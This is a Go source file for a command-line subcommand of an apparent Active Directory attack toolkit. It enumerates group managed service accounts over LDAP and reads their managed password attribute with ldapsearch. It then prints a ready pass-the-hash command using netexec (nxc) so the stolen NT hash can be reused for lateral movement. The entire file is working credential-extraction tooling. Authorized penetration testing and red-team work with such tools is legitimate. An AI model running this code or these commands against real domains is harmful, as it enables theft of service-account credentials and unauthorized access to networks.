package cmd

import (
	"adpack/utils"
	"fmt"
	"strings"

	"github.com/spf13/cobra"
)

var gmsaDCIP, gmsaName, gmsaUser, gmsaPass, gmsaDomain string

var gmsaCmd = &cobra.Command{
	Use: "gmsa", Short: "gMSA account enumeration and password extraction",
}

var gmsaListCmd = &cobra.Command{
	Use: "list", Short: "Enumerate gMSA accounts",
	RunE: func(cmd *cobra.Command, args []string) error {
		if gmsaDomain == "" {
			return fmt.Errorf("--domain is required")
		}
		utils.Step("Enumerating gMSA accounts...")
		result := utils.RunCommand("ldapsearch", "-H", fmt.Sprintf("ldap://%s", gmsaDCIP),
			"-D", fmt.Sprintf("%s@%s", gmsaUser, gmsaDomain), "-w", gmsaPass,
			"-b", buildBaseDN(gmsaDomain), "(objectClass=msDS-GroupManagedServiceAccount)", "sAMAccountName")
		if !result.Success {
			return fmt.Errorf("ldapsearch failed: %s", result.Stderr)
		}
		fmt.Println(result.Stdout)
		return nil
	},
}

var gmsaReadCmd = &cobra.Command{
	Use: "read", Short: "Read gMSA managed password blob",
	RunE: func(cmd *cobra.Command, args []string) error {
		if gmsaDomain == "" {
			return fmt.Errorf("--domain is required")
		}
		utils.Step(fmt.Sprintf("Reading gMSA password for %s...", gmsaName))
		result := utils.RunCommand("ldapsearch", "-H", fmt.Sprintf("ldap://%s", gmsaDCIP),
			"-D", fmt.Sprintf("%s@%s", gmsaUser, gmsaDomain), "-w", gmsaPass,
			"-b", buildBaseDN(gmsaDomain),
			fmt.Sprintf("(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=%s))", gmsaName),
			"msDS-ManagedPassword")
		if !result.Success {
			return fmt.Errorf("ldapsearch failed: %s", result.Stderr)
		}
		fmt.Println(result.Stdout)
		fmt.Println("\nUse gMSA hash with:")
		fmt.Printf("  nxc smb <target> -u %s -H <nt_hash>\n", gmsaName)
		return nil
	},
}

func buildBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		if p != "" {
			dcParts = append(dcParts, "DC="+p)
		}
	}
	return strings.Join(dcParts, ",")
}

func init() {
	gmsaCmd.PersistentFlags().StringVar(&gmsaDCIP, "dc-ip", "", "Domain controller IP")
	gmsaCmd.PersistentFlags().StringVar(&gmsaDomain, "domain", "", "Domain name (e.g., domain.local)")
	gmsaCmd.PersistentFlags().StringVar(&gmsaUser, "user", "", "Username")
	gmsaCmd.PersistentFlags().StringVar(&gmsaPass, "password", "", "Password")
	gmsaReadCmd.Flags().StringVar(&gmsaName, "name", "", "gMSA account name (e.g., svc_gmsa$)")
	gmsaCmd.AddCommand(gmsaListCmd, gmsaReadCmd)
	rootCmd.AddCommand(gmsaCmd)
}
